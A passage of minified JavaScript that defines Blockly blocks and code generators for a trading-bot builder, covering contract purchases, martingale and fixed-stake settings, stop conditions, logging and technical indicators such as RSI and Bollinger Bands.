    options: [["x100", "100"], ["x200", "200"], ["x300", "300"], ["x500", "500"], ["x1000", "1000"]]
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "limittp_nya"
  }, {
    type: "input_value",
    name: "limitsl_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_multiplyup_multiplydown = function (yn, yo) {
  var yp = yn.getFieldValue("selcontract_nya");
  var yq = yn.getFieldValue("market_nya");
  var yr = yq == "activemarket" ? "mainSymbol" : yq == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + yq.split("|")[0] + "\"";
  var ys = yn.getFieldValue("account_nya");
  var yt = yn.getFieldValue("stakeAM_nya");
  var yu = yo.valueToCode(yn, "stake_nya", javascript.Order.ATOMIC);
  if (yu.toString().length == 0) {
    yu = 1;
  }
  ;
  var yv = yn.getFieldValue("selmultipliermultiply_nya");
  var yw = yo.valueToCode(yn, "limittp_nya", javascript.Order.ATOMIC);
  var yx = yo.valueToCode(yn, "limitsl_nya", javascript.Order.ATOMIC);
  var yy = "mainPurchase(\"" + ys + "\",\"" + yt + "\"," + yu + ",\"" + yp + "\"," + yr + ",0,\"t\",0,0,0,0,0,0,0,0,0,\"" + yv + "\"," + yw + "," + yx + ");";
  return yy;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_vanillalongcall_vanillalongput",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Vanilla Long Call", "VANILLALONGCALL"], ["Vanilla Long Put", "VANILLALONGPUT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_vanillalongcall_vanillalongput = function (yz, za) {
  var zb = yz.getFieldValue("selcontract_nya");
  var zc = yz.getFieldValue("market_nya");
  var zd = zc == "activemarket" ? "mainSymbol" : zc == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + zc.split("|")[0] + "\"";
  var ze = yz.getFieldValue("account_nya");
  var zf = yz.getFieldValue("stakeAM_nya");
  var zg = za.valueToCode(yz, "stake_nya", javascript.Order.ATOMIC);
  if (zg.toString().length == 0) {
    zg = 1;
  }
  ;
  var zh = yz.getFieldValue("seldurationunit_nya");
  var zi = za.valueToCode(yz, "inpduration_nya", javascript.Order.ATOMIC);
  var zj = za.valueToCode(yz, "barrier_nya", javascript.Order.ATOMIC);
  var zk = "mainPurchase(\"" + ze + "\",\"" + zf + "\"," + zg + ",\"" + zb + "\"," + zd + "," + zi + ",\"" + zh + "\"," + zj + ",0,0,0,0,0,0,0,0,0,0,0);";
  return zk;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_turboslong_turbosshort",
  message0: "Tipo de Contrato: %1 %2 Conta: %3 %4 Market: %5 %6 Stake %7 %8 Duration: %9 %10 Barrier Offset: %11",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Turbos Long", "TURBOSLONG"], ["Turbos Short", "TURBOSSHORT"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: arrAccount
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket2
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: arrStakeAM
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "field_dropdown",
    name: "seldurationunit_nya",
    options: [["tick(s)", "t"], ["second(s)", "s"], ["minute(s)", "m"], ["hour(s)", "h"], ["day(s)", "d"]]
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "barrier_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_turboslong_turbosshort = function (zl, zm) {
  var zn = zl.getFieldValue("selcontract_nya");
  var zo = zl.getFieldValue("market_nya");
  var zp = zo == "activemarket" ? "mainSymbol" : zo == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + zo.split("|")[0] + "\"";
  var zq = zl.getFieldValue("account_nya");
  var zr = zl.getFieldValue("stakeAM_nya");
  var zs = zm.valueToCode(zl, "stake_nya", javascript.Order.ATOMIC);
  if (zs.toString().length == 0) {
    zs = 1;
  }
  ;
  var zt = zl.getFieldValue("seldurationunit_nya");
  var zu = zm.valueToCode(zl, "inpduration_nya", javascript.Order.ATOMIC);
  var zv = zm.valueToCode(zl, "barrier_nya", javascript.Order.ATOMIC);
  var zw = "mainPurchase(\"" + zq + "\",\"" + zr + "\"," + zs + ",\"" + zn + "\"," + zp + "," + zu + ",\"" + zt + "\"," + zv + ",0,0,0,0,0,0,0,0,0,0,0);";
  return zw;
};
Blockly.defineBlocksWithJsonArray([{
  type: "write_log",
  message0: "Notify %1 Sound: %2 %3",
  args0: [{
    type: "field_dropdown",
    name: "color_nya",
    options: [["No Color", ""], ["Blue", "42a5f5"], ["Red", "f44336"], ["Green", "04AA6D"], ["Yellow", "ffbf00"]]
  }, {
    type: "field_dropdown",
    name: "sound_nya",
    options: [["Silent", "silent"], ["Announcement", "announcement"], ["Earned money", "earned-money"], ["Job done", "job-done"], ["Error", "error"], ["Severe error", "severe-error"]]
  }, {
    type: "input_value",
    name: "log_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.write_log = function (zx, zy) {
  var zz = zy.valueToCode(zx, "log_nya", javascript.Order.ATOMIC);
  var aaa = zx.getFieldValue("color_nya");
  var aab = zx.getFieldValue("sound_nya");
  var aac;
  if (aab == "silent") {
    aac = "";
  } else {
    aac = "document.getElementById(\"" + aab + "\").play();";
  }
  aac += "writeLog(\"#" + aaa + "\"," + zz + ");";
  return aac;
};
let arrPopulatedMarket = [["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"], ["Continuous Indices:Volatility 150 (1s) Index", "1HZ150V|Volatility 150 (1s) Index"], ["Continuous Indices:Volatility 250 (1s) Index", "1HZ250V|Volatility 250 (1s) Index"], ["Daily Reset Indices:Bear Market Index", "RDBEAR|Bear Market Index"], ["Daily Reset Indices:Bull Market Index", "RDBULL|Bull Market Index"], ["Jump Indices:Jump 10 Index", "JD10|Jump 10 Index"], ["Jump Indices:Jump 25 Index", "JD25|Jump 25 Index"], ["Jump Indices:Jump 50 Index", "JD50|Jump 50 Index"], ["Jump Indices:Jump 75 Index", "JD75|Jump 75 Index"], ["Jump Indices:Jump 100 Index", "JD100|Jump 100 Index"], ["Step Indices:Step Index", "stpRNG|Step Index"], ["Crash/Boom Indices:Crash 300 Index", "CRASH300N|Crash 300 Index"], ["Crash/Boom Indices:Crash 500 Index", "CRASH500|Crash 500 Index"], ["Crash/Boom Indices:Crash 1000 Index", "CRASH1000|Crash 1000 Index"], ["Crash/Boom Indices:Boom 300 Index", "BOOM300N|Boom 300 Index"], ["Crash/Boom Indices:Boom 500 Index", "BOOM500|Boom 500 Index"], ["Crash/Boom Indices:Boom 1000 Index", "BOOM1000|Boom 1000 Index"], ["Major Pairs:AUD/JPY", "frxAUDJPY|AUD/JPY"], ["Major Pairs:AUD/USD", "frxAUDUSD|AUD/USD"], ["Major Pairs:EUR/AUD", "frxEURAUD|EUR/AUD"], ["Major Pairs:EUR/CHF", "frxEURCHF|EUR/CHF"], ["Major Pairs:EUR/GBP", "frxEURGBP|EUR/GBP"], ["Major Pairs:EUR/JPY", "frxEURJPY|EUR/JPY"], ["Major Pairs:EUR/USD", "frxEURUSD|EUR/USD"], ["Major Pairs:GBP/AUD", "frxGBPAUD|GBP/AUD"], ["Major Pairs:GBP/JPY", "frxGBPJPY|GBP/JPY"], ["Major Pairs:GBP/USD", "frxGBPUSD|GBP/USD"], ["Major Pairs:USD/CAD", "frxUSDCAD|USD/CAD"], ["Major Pairs:USD/CHF", "frxUSDCHF|USD/CHF"], ["Major Pairs:USD/JPY", "frxUSDJPY|USD/JPY"], ["Minor Pairs:AUD/CAD", "frxAUDCAD|AUD/CAD"], ["Minor Pairs:AUD/CHF", "frxAUDCHF|AUD/CHF"], ["Minor Pairs:AUD/NZD", "frxAUDNZD|AUD/NZD"], ["Minor Pairs:EUR/NZD", "frxEURNZD|EUR/NZD"], ["Minor Pairs:GBP/CAD", "frxGBPCAD|GBP/CAD"], ["Minor Pairs:GBP/CHF", "frxGBPCHF|GBP/CHF"], ["Minor Pairs:GBP/NOK", "frxGBPNOK|GBP/NOK"], ["Minor Pairs:GBP/NZD", "frxGBPNZD|GBP/NZD"], ["Minor Pairs:NZD/JPY", "frxNZDJPY|NZD/JPY"], ["Minor Pairs:NZD/USD", "frxNZDUSD|NZD/USD"], ["Minor Pairs:USD/MXN", "frxUSDMXN|USD/MXN"], ["Minor Pairs:USD/NOK", "frxUSDNOK|USD/NOK"], ["Minor Pairs:USD/PLN", "frxUSDPLN|USD/PLN"], ["Minor Pairs:USD/SEK", "frxUSDSEK|USD/SEK"], ["Asian indices:Australia 200", "OTC_AS51|Australia 200"], ["Asian indices:Hong Kong 50", "OTC_HSI|Hong Kong 50"], ["Asian indices:Japan 225", "OTC_N225|Japan 225"], ["European indices:Euro 50", "OTC_SX5E|Euro 50"], ["European indices:France 40", "OTC_FCHI|France 40"], ["European indices:Germany 40", "OTC_GDAXI|Germany 40"], ["European indices:Netherlands 25", "OTC_AEX|Netherlands 25"], ["European indices:Swiss 20", "OTC_SSMI|Swiss 20"], ["European indices:UK 100", "OTC_FTSE|UK 100"], ["American indices:US 500", "OTC_SPC|US 500"], ["American indices:US Tech 100", "OTC_NDX|US Tech 100"], ["American indices:Wall Street 30", "OTC_DJI|Wall Street 30"], ["Forex Basket:AUD Basket", "WLDAUD|AUD Basket"], ["Forex Basket:EUR Basket", "WLDEUR|EUR Basket"], ["Forex Basket:GBP Basket", "WLDGBP|GBP Basket"], ["Forex Basket:USD Basket", "WLDUSD|USD Basket"], ["Commodities Basket:Gold Basket", "WLDXAU|Gold Basket"], ["Metals:Gold/USD", "frxXAUUSD|Gold/USD"], ["Metals:Palladium/USD", "frxXPDUSD|Palladium/USD"], ["Metals:Platinum/USD", "frxXPTUSD|Platinum/USD"], ["Metals:Silver/USD", "frxXAGUSD|Silver/USD"], ["Cryptocurrencies:BTC/USD", "cryBTCUSD|BTC/USD"], ["Cryptocurrencies:ETH/USD", "cryETHUSD|ETH/USD"]];
Blockly.defineBlocksWithJsonArray([{
  type: "setmarket",
  message0: "Ativar o Mercado: %1",
  args0: [{
    type: "field_dropdown",
    name: "market_nya",
    options: arrPopulatedMarket
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmarket = function (aad, aae) {
  var aaf = aad.getFieldValue("market_nya");
  var aag = "if(mainSymbol!=\"" + aaf.split("|")[0] + "\"){mainSymbol=\"" + aaf.split("|")[0] + "\";document.getElementById(\"lblMarket\").innerText=\"" + aaf.split("|")[1] + "\";forgetAllTicks();};";
  return aag;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtosmartmartingale",
  message0: "Definir Gerenciamento: Martingale Inteligente %1 Voltar ao Stake Inicial SOMENTE após cobrir a perda anterior: %2 %3 Stake Inicial: %4 Fator Martingale: %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_smart_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "initialstake_nya"
  }, {
    type: "input_value",
    name: "martingalefactor_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtosmartmartingale = function (aah, aai) {
  var aaj = aah.getFieldValue("check_smart_nya") === "TRUE";
  var aak = aai.valueToCode(aah, "initialstake_nya", javascript.Order.ATOMIC);
  var aal = aai.valueToCode(aah, "martingalefactor_nya", javascript.Order.ATOMIC);
  var aam = "selMoneyManagement.value=\"smartmartingale\";inpInitStake.value=" + aak + ";inpMartiFactor.value=" + aal + ";chkSmart.checked=" + aaj + ";selMoneyManagementChanged();";
  return aam;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtosmartcyclestake",
  message0: "Definir Gerenciamento: Ciclo de Stake %1 Voltar ao Stake Inicial SOMENTE após cobrir a perda anterior: %2 %3 Ciclo de Stake: %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_smart_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "cyclestake_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtosmartcyclestake = function (aan, aao) {
  var aap = aan.getFieldValue("check_smart_nya") === "TRUE";
  var aaq = aao.valueToCode(aan, "cyclestake_nya", javascript.Order.ATOMIC);
  var aar = "selMoneyManagement.value=\"smartcyclestake\";inpCycleStake.value=" + aaq + ";chkSmart.checked=" + aap + ";selMoneyManagementChanged();";
  return aar;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtofixedstake",
  message0: "Definir Gerenciamento: Stake Fixo %1 Stake Fixo: %2",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "fixedstake_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtofixedstake = function (aas, aat) {
  var aau = aat.valueToCode(aas, "fixedstake_nya", javascript.Order.ATOMIC);
  var aav = "stakeNow=" + aau + ";selMoneyManagement.value=\"fixedstake\";inpInitStake.value=" + aau + ";selMoneyManagementChanged();";
  return aav;
};
Blockly.defineBlocksWithJsonArray([{
  type: "settarget",
  message0: "Definir Metas (Stop Conditions) %1 %2 Meta de Lucro: %3 %4 Stop Loss: %5 %6 Qtde de Win(s): %7 %8 Qtde de Loss(es): %9 %10 Qtde de Entradas: %11 %12 Wins Seguidos: %13 %14 Loss(es) Seguidos: %15",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_targetprofit_nya",
    checked: true
  }, {
    type: "input_value",
    name: "targetprofit_nya"
  }, {
    type: "field_checkbox",
    name: "check_stoploss_nya",
    checked: false
  }, {
    type: "input_value",
    name: "stoploss_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofwins_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofwins_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberoflosses_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberoflosses_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofruns_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofruns_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofwinsinarow_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofwinsinarow_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberoflossesinarow_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberoflossesinarow_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.settarget = function (aaw, aax) {
  var aay = aaw.getFieldValue("check_targetprofit_nya") === "TRUE";
  var aaz = aax.valueToCode(aaw, "targetprofit_nya", javascript.Order.ATOMIC);
  var aba = aaw.getFieldValue("check_stoploss_nya") === "TRUE";
  var abb = aax.valueToCode(aaw, "stoploss_nya", javascript.Order.ATOMIC);
  var abc = aaw.getFieldValue("check_numberofwins_nya") === "TRUE";
  var abd = aax.valueToCode(aaw, "numberofwins_nya", javascript.Order.ATOMIC);
  var abe = aaw.getFieldValue("check_numberoflosses_nya") === "TRUE";
  var abf = aax.valueToCode(aaw, "numberoflosses_nya", javascript.Order.ATOMIC);
  var abg = aaw.getFieldValue("check_numberofruns_nya") === "TRUE";
  var abh = aax.valueToCode(aaw, "numberofruns_nya", javascript.Order.ATOMIC);
  var abi = aaw.getFieldValue("check_numberofwinsinarow_nya") === "TRUE";
  var abj = aax.valueToCode(aaw, "numberofwinsinarow_nya", javascript.Order.ATOMIC);
  var abk = aaw.getFieldValue("check_numberoflossesinarow_nya") === "TRUE";
  var abl = aax.valueToCode(aaw, "numberoflossesinarow_nya", javascript.Order.ATOMIC);
  var abm = "chkTP.checked=" + aay + ";inpTP.value=" + aaz + ";chkSL.checked=" + aba + ";inpSL.value=" + abb + ";chkNumOfWin.checked=" + abc + ";inpNumOfWin.value=" + abd + ";chkNumOfLoss.checked=" + abe + ";inpNumOfLoss.value=" + abf + ";chkNumOfRun.checked=" + abg + ";inpNumOfRun.value=" + abh + ";chkNumOfWinInARow.checked=" + abi + ";inpNumOfWinInARow.value=" + abj + ";chkNumOfLossInARow.checked=" + abk + ";inpNumOfLossInARow.value=" + abl + ";";
  return abm;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setvirtuallose",
  message0: "Definir Loss Virtual %1 %2 Qtde de Loss Virtual: %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_virtuallose_nya",
    checked: true
  }, {
    type: "input_value",
    name: "virtuallose_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setvirtuallose = function (abn, abo) {
  var abp = abn.getFieldValue("check_virtuallose_nya") === "TRUE";
  var abq = abo.valueToCode(abn, "virtuallose_nya", javascript.Order.ATOMIC);
  var abr = "chkVLose.checked=" + abp + ";inpVLose.value=" + abq + ";cekValidasiSlaveToken();";
  return abr;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setadditionalsettings",
  message0: "Definir Pausas %1 %2 Delay após Win (segundos): %3 %4 Delay após Loss (segundos): %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_delayafterwin_nya",
    checked: false
  }, {
    type: "input_value",
    name: "delayafterwin_nya"
  }, {
    type: "field_checkbox",
    name: "check_delayafterlose_nya",
    checked: true
  }, {
    type: "input_value",
    name: "delayafterlose_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setadditionalsettings = function (abt, abu) {
  var abv = abt.getFieldValue("check_delayafterwin_nya") === "TRUE";
  var abw = abt.getFieldValue("delayafterwin_nya");
  var abx = abt.getFieldValue("check_delayafterlose_nya") === "TRUE";
  var aby = abt.getFieldValue("delayafterlose_nya");
  var abz = "chkDelayWin.checked=" + abv + ";inpDelayWin.value=" + abw + ";chkDelayLose.checked=" + abx + ";inpDelayLose.value=" + aby + ";";
  return abz;
};
Blockly.defineBlocksWithJsonArray([{
  type: "resultis",
  message0: "Result is %1",
  args0: [{
    type: "field_dropdown",
    name: "result_nya",
    options: [["Win", "win"], ["Loss", "loss"], ["Virtual Win", "virtualwin"], ["Virtual Loss", "virtualloss"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.resultis = function (aca, acb) {
  var acc = aca.getFieldValue("result_nya");
  var acd = "lastCont_result==\"" + acc + "\"";
  return [acd, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "readyfortrade",
  message0: "Ready For Trade",
  args0: [],
  previousStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: "",
  extensions: ["readyfortrade_onchange"]
}]);
javascript.javascriptGenerator.forBlock.readyfortrade = function (ace, acf) {
  var acg = "izinRun2=true;";
  return acg;
};
Blockly.Extensions.register("readyfortrade_onchange", function () {
  this.setOnChange(function (ach) {
    if (this.workspace.isDragging()) {
      return;
    }
    let aci;
    let acj;
    aci = this.getSurroundParent();
    acj = false;
    while (aci !== null) {
      if (aci.type === "runonceatstart") {
        acj = true;
        break;
      }
      ;
      aci = aci.getSurroundParent();
    }
    if (!acj) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Ready For Trade\" must inside BLOCK 1");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "checkagain",
  message0: "Check Again",
  args0: [],
  previousStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: "",
  extensions: ["checkagain_onchange"]
}]);
javascript.javascriptGenerator.forBlock.checkagain = function (ack, acl) {
  var acm = "izinRun2=true;";
  return acm;
};
Blockly.Extensions.register("checkagain_onchange", function () {
  this.setOnChange(function (acn) {
    if (this.workspace.isDragging()) {
      return;
    }
    let aco;
    let acp;
    aco = this.getSurroundParent();
    acp = false;
    while (aco !== null) {
      if (aco.type === "purchaseconditions") {
        acp = true;
        break;
      }
      ;
      aco = aco.getSurroundParent();
    }
    if (!acp) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Check Again\" must inside BLOCK 2");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "tradeagain",
  message0: "Trade Again",
  args0: [],
  previousStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: "",
  extensions: ["tradeagain_onchange"]
}]);
javascript.javascriptGenerator.forBlock.tradeagain = function (acq, acr) {
  var acs = "izinRun2=true;";
  return acs;
};
Blockly.Extensions.register("tradeagain_onchange", function () {
  this.setOnChange(function (act) {
    if (this.workspace.isDragging()) {
      return;
    }
    let acu;
    let acv;
    acu = this.getSurroundParent();
    acv = false;
    while (acu !== null) {
      if (acu.type === "restarttradingconditions") {
        acv = true;
        break;
      }
      ;
      acu = acu.getSurroundParent();
    }
    if (!acv) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Trade Again\" must inside BLOCK 4");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "stopbot",
  message0: "Stop Robot",
  args0: [],
  previousStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.stopbot = function (acw, acx) {
  var acy = "if(btn_run.src.split(\"/\").pop() == \"icon_stop.png\"){btn_run.click();}";
  return acy;
};
Blockly.defineBlocksWithJsonArray([{
  type: "balance",
  message0: "Banca: %1",
  args0: [{
    type: "field_dropdown",
    name: "tipe_nya",
    options: [["Number", "number"], ["String", "string"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.balance = function (acz, ada) {
  var adb = acz.getFieldValue("tipe_nya");
  var adc = "";
  if (adb == "string") {
    adc = "\"" + summary_balance.innerText.split(" ")[0] + "\"";
  } else {
    adc = "summary_balance.innerText.split(\" \")[0]*1";
  }
  return [adc, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "summary",
  message0: "Summary: %1",
  args0: [{
    type: "field_dropdown",
    name: "data_nya",
    options: [["No. Of Runs", "noofruns"], ["Total Stake", "totalstake"], ["Total Payout", "totalpayout"], ["No. Of Win(s)", "win"], ["No. Of Loss(es)", "loss"], ["Total Profit/Loss", "totalprofitloss"]]
  }],
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.summary = function (ade, adf) {
  var adg = ade.getFieldValue("data_nya");
  var adh = "summary_" + adg + ".innerText*1";
  return [adh, Blockly.JavaScript.ORDER_NONE];
};
const sleep = adi => {
  return new Promise(adj =>
  
  
  setTimeout(adj, adi));
};
Blockly.defineBlocksWithJsonArray([{
  type: "runafter",
  message0: "%1 Run After %2 Second(s)",
  args0: [{
    type: "input_statement",
    name: "statement_nya"
  }, {
    type: "input_value",
    name: "seconds_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.runafter = function (adk, adl) {
  var adm = adl.statementToCode(adk, "statement_nya");
  var adn = adl.valueToCode(adk, "seconds_nya", javascript.Order.ATOMIC);
  var ado = "sleep(" + adn * 1000 + ").then(() => {" + adm + ";})";
  return ado;
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorsmaarray",
  message0: "Simple Moving Average Array %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorsmaarray = function (adp, adq) {
  var adr = adq.valueToCode(adp, "inputlist_nya", javascript.Order.ATOMIC);
  var ads = adq.valueToCode(adp, "period_nya", javascript.Order.ATOMIC);
  var adt = "calculateMovingAverage(" + adr + "," + ads + ")";
  return [adt, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorrsi",
  message0: "Relative Strength Index %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorrsi = function (adu, adv) {
  var adw = adv.valueToCode(adu, "inputlist_nya", javascript.Order.ATOMIC);
  var adx = adv.valueToCode(adu, "period_nya", javascript.Order.ATOMIC);
  var ady = "calculateRSI(" + adw + "," + adx + ")";
  return [ady, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorrsiarray",
  message0: "Relative Strength Index Array %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorrsiarray = function (adz, aea) {
  var aeb = aea.valueToCode(adz, "inputlist_nya", javascript.Order.ATOMIC);
  var aec = aea.valueToCode(adz, "period_nya", javascript.Order.ATOMIC);
  var aed = "calculateRSIArray(" + aeb + "," + aec + ")";
  return [aed, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorbollingerbands",
  message0: "Bollinger Bands [Upper,Middle,Lower] %1 Input List %2 Period %3 Standard Deviation %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }, {
    type: "input_value",
    name: "stddev_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorbollingerbands = function (aee, aef) {
  var aeg = aef.valueToCode(aee, "inputlist_nya", javascript.Order.ATOMIC);
  var aeh = aef.valueToCode(aee, "period_nya", javascript.Order.ATOMIC);
  var aei = aef.valueToCode(aee, "stddev_nya", javascript.Order.ATOMIC);
  var aej = "calculateBollingerBands(" + aeg + "," + aeh + "," + aei + ")";
  return [aej, Blockly.JavaScript.ORDER_NONE];
};

Blockly.defineBlocksWithJsonArray([{
  type: "indicatorcci",
  message0: "Commodity Channel Index (CCI) Ticks %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "Commodity Channel Index (CCI) é um indicador técnico que mede a variação do preço em relação à média móvel de um ativo.",
  helpUrl: ""
}]);

